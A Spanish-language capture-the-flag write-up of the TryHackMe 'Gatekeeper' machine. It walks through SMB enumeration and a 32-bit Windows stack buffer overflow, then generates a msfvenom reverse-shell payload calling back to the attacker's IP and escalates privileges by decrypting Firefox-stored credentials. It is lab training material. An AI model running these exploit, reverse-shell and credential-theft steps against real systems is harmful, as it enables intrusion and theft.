---
title:  "Gatekeeper - Writeup - Tryhackme"
categories: 
  - Tryhackme
tags:
  - Buffer Overflow
  - Windows
  - eCPPT
toc: true
toc_label: "Tabla de contenido"
---

En este artículo estaré mostrando como resolver la máquina [Gatekeeper](https://tryhackme.com/room/gatekeeper) de Tryhackme.

Una de las cosas que nos permitirá esta máquina es explotar un binario vulnerable a buffer overflow, además que es una de las máquinas que recomiendan resolver previo al examen del **eCPPT** y decidí incorporarla a mi preparación previa al mismo.

## Reconocimiento

En esta fase de reconocimiento deberemos enumerar los puertos, versiones y servicios que se están ejecutando o se encuentran disponibles en nuestro objetivo.

### Puertos abiertos

**Comando:**

```python
nmap -sS --min-rate 200 -p- --open -n -v -Pn -oN ports 10.10.239.240
```

**Resultado:**

```python
# Nmap 7.91 scan initiated Fri Oct  1 08:02:08 2021 as: nmap -sS --min-rate 200 -p- --open -n -v -Pn -oG allPorts -oN ports 10.10.239.240
Nmap scan report for 10.10.239.240
Host is up (0.22s latency).
Not shown: 33442 closed ports, 32087 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
31337/tcp open  Elite
49154/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Oct  1 08:04:21 2021 -- 1 IP address (1 host up) scanned in 133.34 seconds
```

### Sistema Operativo

Como hemos visto con el comando anterior, ya sabemos que puertos están abiertos, por lo cual lo siguiente que deberíamos hacer es enumerar más los puertos que obtuvimos como resultado.

Si es cierto que algunos puertos ya nos serán conocidos como por ejemplo el `445`, por lo cual podemos ir adelantando trabajo y enumerarlo para saber mejor a que sistema nos estamos enfrentando.

**Comando:**

```python
crackmapexec smb 10.10.239.240
```

**Resultado:**

```python
SMB   10.10.239.240   445   GATEKEEPER   [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:GATEKEEPER) (domain:gatekeeper) (signing:False) (SMBv1:True)
```

### Servicios y  versiones

Ahora que sabemos que puertos están abiertos en nuestro objetivo, deberemos realizar un escaneo más exhaustivo sobre los mismos, para lo cual el siguiente comando nos sera de ayuda.

**Comando:**

```python
nmap -sV -sC -p135,139,445,3389,31337,49154 -oN serviciosVersiones 10.10.239.240
```

**Resultado:**

```python
# Nmap 7.91 scan initiated Fri Oct  1 08:13:08 2021 as: nmap -sV -sC -p135,139,445,3389,31337,49154 -oN serviciosVersiones 10.10.239.240
Nmap scan report for 10.10.239.240
Host is up (0.18s latency).

PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: GATEKEEPER
|   NetBIOS_Domain_Name: GATEKEEPER
|   NetBIOS_Computer_Name: GATEKEEPER
|   DNS_Domain_Name: gatekeeper
|   DNS_Computer_Name: gatekeeper
|   Product_Version: 6.1.7601
|_  System_Time: 2021-10-01T13:15:56+00:00
| ssl-cert: Subject: commonName=gatekeeper
| Not valid before: 2021-09-30T12:57:33
|_Not valid after:  2022-04-01T12:57:33
|_ssl-date: 2021-10-01T13:16:02+00:00; -1s from scanner time.
31337/tcp open  Elite?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help: 
|     Hello HELP
|   Kerberos: 
|     Hello !!!
|   LDAPSearchReq: 
|     Hello 0
|     Hello
|   LPDString: 
|     Hello 
|     default!!!
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
49154/tcp open  msrpc              Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.91%I=7%D=10/1%Time=61570976%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r
SF:(SIPOptions,142,"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x20
SF:Via:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20<sip:nm@n
SF:m>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2>\r!!!\nHello\x20Call-ID:
SF:\x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-Forw
SF:ards:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact:
SF:\x20<sip:nm@nm>\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\x
SF:20\r!!!\n")%r(GenericLines,16,"Hello\x20\r!!!\nHello\x20\r!!!\n")%r(HTT
SF:POptions,28,"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n"
SF:)%r(RTSPRequest,28,"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x20\
SF:r!!!\n")%r(Help,F,"Hello\x20HELP\r!!!\n")%r(SSLSessionReq,C,"Hello\x20\
SF:x16\x03!!!\n")%r(TerminalServerCookie,B,"Hello\x20\x03!!!\n")%r(TLSSess
SF:ionReq,C,"Hello\x20\x16\x03!!!\n")%r(Kerberos,A,"Hello\x20!!!\n")%r(Fou
SF:rOhFourRequest,47,"Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%2eba
SF:k\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(LPDString,12,"Hello\x20\x01de
SF:fault!!!\n")%r(LDAPSearchReq,17,"Hello\x200\x84!!!\nHello\x20\x01!!!\n"
SF:);
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 47m59s, deviation: 1h47m20s, median: -1s
|_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 02:3b:f7:88:5b:77 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: gatekeeper
|   NetBIOS computer name: GATEKEEPER\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-10-01T09:15:56-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-10-01T13:15:56
|_  start_date: 2021-10-01T12:57:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct  1 08:16:04 2021 -- 1 IP address (1 host up) scanned in 175.85 seconds
```

### SMB

Sabemos desde antes que el servicio `SMB` esta abierto, por lo cual decidí probar si era capaz de enumerar los recursos en el sin tener credenciales.

```python
smbmap -H 10.10.239.240 -u 'null'
```

![Gatekeeper SMB](/assets/images/gatekeeperSmb.png)

En efecto podemos enumerar los recursos del servicio `SMB` sin tener credenciales y también podemos observar que sobre el recurso `Users` tenemos permisos de lectura, por lo cual deberemos enumerarlo.

```bash
smbmap -H 10.10.239.240 -u 'null' -R Users
```

![CompilaciónBuffLinux32](/assets/images/gatekeeperExe.png)

Para transferir el binario `gatekeeper.exe` a nuestra máquina deberemos conectarnos al recurso `Users` y descargarlo.

Para eso los siguientes comandos nos sera de ayuda.

```python
smbclient //10.10.239.240/Users -N
cd Share
get gatekeeper.exe
```

Una vez `gatekeeper.exe` este en nuestra máquina podemos saber un poco más de el gracias al comando `file`

![CompilaciónBuffLinux32](/assets/images/filegatepeekeer.png)

Vemos que es un ejecutable de 32 bits para windows.

## Laboratorio

Para poder hacer un mejor análisis de `gatekeeper.exe` debemos optar por ejecutarlo en una máquina con características parecidas a la que lo aloja, es por eso que de manera previa enumeramos el [Sistema Operativo](http://localhost:4000/tryhackme/gatekeeper/#sistema-operativo).

Quiero aclarar que hay distintas formas de explotar `gatekeeper.exe`, pero para mí la forma más cómoda es la que veremos a continuación.

**Necesitaremos:**

- Una máquina virtual Windows 7 Professional de 32 bits.
- [Immunity debugger](http://www.immunityinc.com/products/debugger/)
- [Mona](https://github.com/corelan/mona/blob/master/mona.py)

### Transferencia

Existen varias formas de transferir un binario a nuestra máquina virtual, en este caso yo utilicé `smbserver.py`.

```sql
smbserver.py share . -smb2support -username jch -password password123
```

Tras ejecutar el comando previo se nos habilitara un servicio `SMB` con un recurso compartido, en este caso `share` que mostrara todos los recursos que se encuentran en la ruta donde se levanto el servicio y al cual podemos acceder desde desde otros activos, siempre y cuando se encuentren **"dentro"** del mismo segmento red.

![Transferencia de gatekeeper](/assets/images/smbGatepeeker.png)

Una vez tengamos el binario en nuestra máquina podemos ejecutarlo desde [Immunity debugger](http://www.immunityinc.com/products/debugger/).

Muy importante debemos cerciorarnos que se este ejecutando el binario`(Running)`.

![Ejecución en immunity](/assets/images/immunity.png)

**Nota:**
Una vez nuestro binario se encuentre ejecutándose, si realizamos un escaneo a nuestra máquina virtual veremos que tiene el puerto `31337` abierto al igual que en nuestro objetivo.
{: .notice--danger}

### Mona

Esta utilidad es un script en python que nos brindara varias funcionalidades permitiéndonos facilitar el trabajo a la hora de explotar un binario, entre otras más.

Para incorporarlo en nuestro `Immunity debugger` deberemos realizar lo siguiente:

- Descargar [mona](https://github.com/corelan/mona/blob/master/mona.py).
- Guardar el archivo como **`mona.py`**.
- Ponerlo en **C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands**.

Para verificar si `mona` esta instalado correctamente podemos ejecutar el siguiente comando `!mona`.
{: .notice--danger}

![Mona install](/assets/images/monaInstall.png)

## Explotación

Podemos observar que `gatekeeper.exe` lo que hace es recibir una cadena y luego imprimirla.

![Testing gatekeeper](/assets/images/gatekeeperImmunity.png)

Para poder corromper el binario podríamos ir probando enviando una cadena con una cantidad especifica de caracteres, hasta llegar a un número en el cual se desborde el buffer, o podríamos hacerlo mediante un script, que vaya enviando e incrementando cada vez mas la longitud de la cadena hasta lograr corromperlo, como lo veremos a continuación.

```sql
python3 fuzzer.py 192.168.1.10 31337
```
[fuzzer.py](https://github.com/hacknotes/h4ckn0tes/blob/main/Buffer%20Overflow/Windows/Stack%20Based%2032%20Bits%20(Gatekeeper)/fuzzer.py)

![Buffer Gatekeeper](/assets/images/fuzzergatekeeper.png)

**Nota:**
Recordar que todo este proceso lo realizaremos primero de forma local en nuestra máquina virtual.
{: .notice--danger}

### 1. Calculando el offset

Como pudimos ver al enviar una cadena de 150 bytes el binario se corrompe. Esta cantidad nos sera de ayuda para obtener el valor del offset.

- Crearemos una cadena aleatoria de `150` de caracteres.
 
   **Comando:**

  ```python
  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 150
  ```

  **Resultado:**

  ```python
  Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
  ```
  Esta cadena la podemos copiar y pegar para enviarla, pero en este caso haremos el uso de un script en python.

  **Nota:**
  No olvidar que tras cada ejecución nuestro binario se corromperá, por lo cual debemos **volver** a ejecutarlo.
  {: .notice--danger}
  ```python
  python obset.py 192.168.1.10 31337
  ```
  [obset.py](https://github.com/hacknotes/h4ckn0tes/blob/main/Buffer%20Overflow/Windows/Stack%20Based%2032%20Bits%20(Gatekeeper)/obset.py)

  ![EIP Control Gatekeeper](/assets/images/eipcontrolGatekeeper.png)

  Vemos que nuevamente nuestro binario se corrompe, de este paso, lo más importante es prestar atención al valor del `EIP`, ya que este nos servirá para encontrar el `offset`.

- Obtenemos el valor del offset.

  El valor del EIP, lo deberemos pasar como parámetro al siguiente comando para obtener el valor del offset.
 
  ```python
  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39654138
  ```
  **Resultado:**
  ```python
  [*] Exact match at offset 146
  ```

### 2. Controlando el **EIP**.

  A nuestro script anterior debemos hacerle unas pequeñas modificaciones, ya que en este caso no enviaremos una cadena con caracteres aleatorios, esta vez la enviaremos con valores definidos por nosotros para ver si como resultado tenemos el control del `EIP`.

  Enviaremos la letra `"A"` multiplicada por el valor del offset, más 4 bytes que serán `"B"` y por ultimo sumaremos `"C"`.

  ```python
  "A"*146 + "B"*4 + "C"*500
  ```
  [eipcontrol.py](https://github.com/hacknotes/h4ckn0tes/blob/main/Buffer%20Overflow/Windows/Stack%20Based%2032%20Bits%20(Gatekeeper)/eipcontrol.py)

  ![Verificación del control del EIP](/assets/images/eipverificationGatekeeper.png)

  Vemos que efectivamente somos capaces de sobre escribir el `EIP` con nuestras "B" `(0x42)`.

### 3. Directorio de trabajo con mona

El siguiente comando nos creara una carpeta en el escritorio de trabajo, específicamente para el binario que estamos ejecutando `(`gatekeeper.exe`)`.

**Nota:**
La carpeta no aparecerá hasta que la misma tenga contenido.
{: .notice--danger}

```sql
!mona config -set workingfolder C:\Users\jch\Desktop\%p
```

![Directorio de gatekeeper](/assets/images/directoryGatekeeper.png)

### 4. Lista de badchars con mona

Puedes ejecutar el primer comando para crear una lista de badchars, o el segundo para lo mismo pero descartando el badchar `"\x00"`, ya que se sabe que este siempre da problemas.

```sql
!mona bytearray
!mona bytearray -cpb "\x00"
```

![Creación de badchars](/assets/images/badCharsMonaGatekeeper.png)

Observamos que nos crea dos ficheros en nuestro directorio de trabajo creado anteriormente.

El fichero `bytearray.bin` lo deberemos ir creando periódicamente tras cada ejecución para ir lo comparando con los badchars que le enviaremos y ir eliminando uno a uno hasta quedarnos sin badchars.

El fichero `bytearray` nos servirá para copiar y pegar su contenido en nuestro script y luego enviarlo para compararlo con `bytearray.bin`.

### 5. Eliminando badchars

Para este paso ejecutaremos [badChars.py](https://github.com/hacknotes/h4ckn0tes/blob/main/Buffer%20Overflow/Windows/Stack%20Based%2032%20Bits%20(Gatekeeper)/badChars.py) hasta que no se nos muestre mas badchars.

```sql
python badChars.py 192.168.1.10 31337
```
Una vez ejecutamos el script, nuevamente se corromperá nuestro binario, pero en este punto debemos poner atención al valor del **`ESP`**, ya que con este compararemos nuestra data enviada con el fichero `bytearray.bin`.

![Comparando badchars](/assets/images/discartBadcharsGatekeeper.png)

Para comparar necesitaremos el siguiente comando.

```sql
!mona compare -f C:\Users\jch\Desktop\gatekeeper -a 006119F8
```

![Badchars gatekeeper](/assets/images/badcharsgate.png)

Observamos que se nos lista dos badchars, el `00` y el `0a`, estos deberemos quitarlos de nuestra lista en el script [badChars.py](https://github.com/hacknotes/h4ckn0tes/blob/main/Buffer%20Overflow/Windows/Stack%20Based%2032%20Bits%20(Gatekeeper)/badChars.py) y crear otra lista con `mona` pero quitando los dos badchars listados.

```sql
!mona bytearray -cpb "\x00\x0a"
```

![Eliminando badchars](/assets/images/descartandobadcharsgatekeeper.png)

Estos pasos deberemos ir los ejecutando una y otra vez hasta que `no` se nos liste mas badchars.

**Nota:**
No olvidemos ir los comparando con el valor del `ESP`.
{: .notice--danger}

```sql
!mona compare -f C:\Users\jch\Desktop\gatekeeper\bytearray.bin -a 004A19F8
```

![Sin badchars](/assets/images/sinBadchars.png)

### 6. Dirección de jmp

El siguiente comando nos permitirá encontrar una dirección de jmp que no contenga los badchars que encontramos en los pasos previos.

Esta dirección nos servirá para hacer un salto al `ESP` permitiéndonos ejecutar un shellcode que le pasemos al mismo.

```sql
!mona jmp -r esp -cpb "\x00\x0a"
```
![jmp gatekeeper](/assets/images/jmpGatekeeper.png)

Podemos observar que se nos lista dos direcciones y que las mismas son capaces de leer y ejecutar lo que se encuentra en `ESP`.

De estas dos direcciones, podemos elegir cualquiera de las dos.

### 7. Reverse Shell

Una vez hemos eliminado **todos** los badchars y teniendo una dirección al `ESP` podremos crear nuestra shell para poder obtener una conexión reversa hacia nuestro equipo de atacante.

El resultado del siguiente comando lo debemos poner en nuestro script final [finalexploit.py](https://github.com/hacknotes/h4ckn0tes/blob/main/Buffer%20Overflow/Windows/Stack%20Based%2032%20Bits%20(Gatekeeper)/finalexpolit.py).

```python
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 EXITFUNC=thread -a x86 --platform windows -b "\x00\x0a" -e x86/shikata_ga_nai -f c
```

![Shell local](/assets/images/rshellGateLocal.png)

Una vez hemos conseguido ejecución remota de comandos con nuestro script, lo único que nos queda es crear una nueva shell con nuestra `IP` de Tryhackme y enviarla.

```sql
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.64.18 LPORT=443 EXITFUNC=thread -a x86 --platform windows -b "\x00\x0a" -e x86/shikata_ga_nai -f c
```

![Shell Gatekeeper](/assets/images/rshellGatekeeper.png)

## Escalada de privilegios

### 1. Descargamos ficheros que almacena firefox

En este caso nos aprovecharemos de credenciales que almacena **firefox**.

```python
cd C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
```

De este directorio descargaremos unos ficheros que luego nos servirán para obtener las credenciales almacenadas, por medio de [firefox_decrypt.py](https://github.com/Unode/firefox_decrypt/blob/master/firefox_decrypt.py).

- cert9.db
- cookies.sqlite
- key4.db
- logins.json

### 2. Obtenemos las credenciales

Ejecutaremos el siguiente comando pasándole como parámetro el directorio donde se encuentran nuestros ficheros descargados.

```python
python3 firefox_decrypt.py /home/jch/THM/Gatekeeper/content/firefox
```

![Credenciales de firefox](/assets/images/credsGatekeeper.png)

### 3. Shell

```sql
psexec.py mayor:8CL7O1N78MdrCIsV@10.10.139.67
```

![Shell como nt authority\system](/assets/images/shellRootGatekeeper.png)
